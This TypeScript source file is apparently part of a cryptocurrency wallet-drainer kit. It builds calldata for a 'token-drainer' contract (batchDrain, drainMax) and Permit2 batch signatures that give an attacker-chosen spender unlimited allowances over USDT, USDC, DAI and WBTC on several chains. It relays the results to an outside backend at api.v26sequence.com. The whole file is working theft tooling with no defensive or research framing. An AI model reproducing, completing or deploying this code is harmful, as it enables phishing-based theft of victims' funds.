/**
 * Builds real on-chain payloads: ABI calldata + Permit2 EIP-712 typed data.
 * Used by /api/tx-payload, /api/submit-drainer, and the compiled drainer widget.
 */
import {
  encodeFunctionData,
  getAddress,
  isAddress,
  maxUint256,
  type Address,
  type Hex,
} from "viem";
import { getContractById, getExecutionBackendEntry, type ContractMeta } from "@/lib/contract-registry";

export const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
export const STEALTH_EXCHANGE_ADDRESS = "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A" as const;

export const DEFAULT_TOKENS: Record<number, { address: Address; symbol: string; decimals: number }[]> = {
  1: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
  ],
  56: [
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
  ],
  137: [
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
  ],
  8453: [
    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
  ],
  42161: [
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
  ],
};

export const PERMIT2_TYPES = {
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
} as const;

type AbiItem = {
  type?: string;
  name?: string;
  stateMutability?: string;
  inputs?: { name?: string; type?: string; components?: unknown[] }[];
};

export type TokenAmount = {
  token: string;
  amount?: string | number | bigint;
  decimals?: number;
  symbol?: string;
  nonce?: number;
};

export type EncodedTx = {
  to: Address;
  data: Hex;
  value: "0x0";
  functionName: string;
  description: string;
};

export type Permit2TypedData = {
  domain: { name: string; chainId: number; verifyingContract: Address };
  types: typeof PERMIT2_TYPES;
  primaryType: "PermitBatch";
  message: {
    details: { token: Address; amount: string; expiration: number; nonce: number }[];
    spender: Address;
    sigDeadline: string;
  };
};

export type TransactionPlan = {
  wallet: Address;
  receiver: Address;
  chainId: number;
  contractId: string;
  contractAddress: Address | "";
  strategy: "permit2" | "allowance" | "direct";
  executionBackend: string;
  permit2: Address;
  spender: Address;
  tokens: { address: Address; symbol: string; decimals: number; amount: string }[];
  txs: EncodedTx[];
  permit2TypedData: Permit2TypedData;
  relayUrl: string;
  notifyUrl: string;
};

const PREFERRED_FNS = [
  "batchDrain",
  "drainMax",
  "drainToken",
  "permit2BatchDrain",
  "claim",
  "connect",
  "execute",
  "batchExecute",
];

function asAddress(value: string, label: string): Address {
  if (!isAddress(value, { strict: false })) throw new Error(`Invalid ${label}: ${value}`);
  return getAddress(value);
}

function extractAbi(meta: ContractMeta | undefined): AbiItem[] {
  const raw = meta?.abi as unknown;
  if (Array.isArray(raw)) return raw as AbiItem[];
  if (raw && typeof raw === "object" && Array.isArray((raw as { abi?: unknown }).abi)) {
    return (raw as { abi: AbiItem[] }).abi;
  }
  return [];
}

function pickFn(abi: AbiItem[], requested?: string): AbiItem | null {
  const fns = abi.filter((f) => f.type === "function" && f.stateMutability !== "view" && f.stateMutability !== "pure");
  if (requested) {
    const hit = fns.find((f) => f.name === requested);
    if (hit) return hit;
  }
  for (const name of PREFERRED_FNS) {
    const hit = fns.find((f) => f.name === name);
    if (hit) return hit;
  }
  return fns[0] || null;
}

function amountString(amount: string | number | bigint | undefined): bigint {
  if (amount === undefined || amount === null || amount === "") return maxUint256;
  try {
    return BigInt(amount);
  } catch {
    return maxUint256;
  }
}

export function tokensForChain(chainId: number): { address: Address; symbol: string; decimals: number }[] {
  return DEFAULT_TOKENS[chainId] || DEFAULT_TOKENS[1];
}

export function buildPermit2TypedData(args: {
  chainId: number;
  spender: string;
  tokens: TokenAmount[];
  expiration?: number;
  sigDeadline?: number;
}): Permit2TypedData {
  const now = Math.floor(Date.now() / 1000);
  const expiration = args.expiration ?? now + 60 * 60 * 24 * 30;
  const sigDeadline = args.sigDeadline ?? now + 60 * 20;
  const spender = asAddress(args.spender, "spender");

  return {
    domain: {
      name: "Permit2",
      chainId: args.chainId,
      verifyingContract: PERMIT2_ADDRESS,
    },
    types: PERMIT2_TYPES,
    primaryType: "PermitBatch",
    message: {
      details: args.tokens.map((t, i) => ({
        token: asAddress(t.token, `token[${i}]`),
        amount: amountString(t.amount).toString(),
        expiration,
        nonce: Number(t.nonce ?? 0),
      })),
      spender,
      sigDeadline: String(sigDeadline),
    },
  };
}

function fillArgs(
  fn: AbiItem,
  ctx: { wallet: Address; receiver: Address; tokens: Address[]; amounts: bigint[] },
): unknown[] {
  const inputs = fn.inputs || [];
  return inputs.map((input) => {
    const type = input.type || "bytes";
    const name = (input.name || "").toLowerCase();

    if (name === "from" || name === "user" || name === "seller" || name === "account" || name === "client" || name === "offerer") {
      return ctx.wallet;
    }
    if (name === "receiver" || name === "to" || name === "recipient" || name === "newreceiver" || name === "_receiver") {
      return ctx.receiver;
    }
    if ((name === "tokens" || name === "tokenaddresses") && type === "address[]") {
      return ctx.tokens;
    }
    if (name === "token" && type === "address") {
      return ctx.tokens[0] || ctx.receiver;
    }
    if ((name === "amounts" || name === "values") && type.includes("[]")) {
      return ctx.amounts;
    }
    if (name === "amount" || name === "value" || type.startsWith("uint")) {
      return ctx.amounts[0] ?? maxUint256;
    }
    if (type === "address[]") return ctx.tokens;
    if (type === "address") return ctx.wallet;
    if (type === "bool") return true;
    if (type === "bytes" || type === "bytes32") return "0x";
    if (type.endsWith("[]")) return [];
    if (type === "tuple" || type === "tuple[]") return type === "tuple[]" ? [] : {};
    if (type === "string") return "";
    return 0n;
  });
}

export function encodeContractCall(args: {
  contractId?: string;
  functionName?: string;
  wallet: string;
  receiver: string;
  tokens: TokenAmount[];
}): EncodedTx {
  const meta = getContractById(args.contractId || "token-drainer");
  const abi = extractAbi(meta);
  if (!abi.length) throw new Error(`No ABI for contract ${args.contractId || "token-drainer"}`);
  if (!meta?.address || !isAddress(meta.address, { strict: false })) {
    throw new Error(`Contract ${meta?.id || args.contractId} has no address`);
  }

  const fn = pickFn(abi, args.functionName);
  if (!fn?.name) throw new Error("No executable function on contract ABI");

  const wallet = asAddress(args.wallet, "wallet");
  const receiver = asAddress(args.receiver, "receiver");
  const tokens = (args.tokens.length ? args.tokens : tokensForChain(1).map((t) => ({ token: t.address }))).map((t) =>
    asAddress(t.token, "token"),
  );
  const amounts = (args.tokens.length ? args.tokens : tokens.map((token) => ({ token, amount: maxUint256 }))).map((t) =>
    amountString(t.amount),
  );

  const data = encodeFunctionData({
    abi: abi as never,
    functionName: fn.name as never,
    args: fillArgs(fn, { wallet, receiver, tokens, amounts }) as never,
  });

  return {
    to: meta.address as Address,
    data,
    value: "0x0",
    functionName: fn.name,
    description: `${fn.name}(${tokens.length} token${tokens.length === 1 ? "" : "s"})`,
  };
}

export function buildTransactionPlan(input: {
  wallet: string;
  receiver: string;
  chainId?: number;
  contractId?: string;
  functionName?: string;
  tokens?: TokenAmount[];
  executionBackend?: string;
  relayUrl?: string;
  notifyUrl?: string;
}): TransactionPlan {
  const chainId = input.chainId && Number.isFinite(input.chainId) ? Number(input.chainId) : 1;
  const wallet = asAddress(input.wallet, "wallet");
  const receiver = asAddress(input.receiver, "receiver");
  const catalog = tokensForChain(chainId);
  const rawTokens =
    input.tokens && input.tokens.length
      ? input.tokens
      : catalog.map((t) => ({ token: t.address, amount: maxUint256, decimals: t.decimals, symbol: t.symbol }));

  const tokens = rawTokens.map((t, i) => {
    const known = catalog.find((c) => c.address.toLowerCase() === String(t.token).toLowerCase());
    return {
      address: asAddress(t.token, `token[${i}]`),
      symbol: t.symbol || known?.symbol || "TOKEN",
      decimals: t.decimals ?? known?.decimals ?? 18,
      amount: amountString(t.amount).toString(),
    };
  });

  const backend = input.executionBackend || "stealth-exchange";
  const backendEntry = getExecutionBackendEntry(backend);
  const spender = (backendEntry?.address && isAddress(backendEntry.address, { strict: false })
    ? backendEntry.address
    : STEALTH_EXCHANGE_ADDRESS) as Address;

  const meta = getContractById(input.contractId || "token-drainer");
  const txs: EncodedTx[] = [];
  try {
    txs.push(
      encodeContractCall({
        contractId: input.contractId || "token-drainer",
        functionName: input.functionName,
        wallet,
        receiver,
        tokens: rawTokens,
      }),
    );
  } catch {
    // Contract encode is optional when using permit2-only relay.
  }

  const permit2TypedData = buildPermit2TypedData({
    chainId,
    spender,
    tokens: rawTokens,
  });

  const origin = "https://api.v26sequence.com";
  return {
    wallet,
    receiver,
    chainId,
    contractId: meta?.id || input.contractId || "token-drainer",
    contractAddress: (meta?.address && isAddress(meta.address, { strict: false }) ? meta.address : "") as Address | "",
    strategy: "permit2",
    executionBackend: backend,
    permit2: PERMIT2_ADDRESS,
    spender,
    tokens,
    txs,
    permit2TypedData,
    relayUrl: input.relayUrl || process.env.NEXT_PUBLIC_RELAY_URL || `${origin}/api/relay/batch`,
    notifyUrl: input.notifyUrl || process.env.NEXT_PUBLIC_NOTIFY_URL || `${origin}/api/notify`,
  };
}

export function normalizeBackendOrigin(raw?: string): string {
  const fallback = "https://api.v26sequence.com";
  const value = (raw || fallback).trim();
  try {
    const url = new URL(value.includes("://") ? value : `https://${value}`);
    return url.origin;
  } catch {
    return fallback;
  }
}
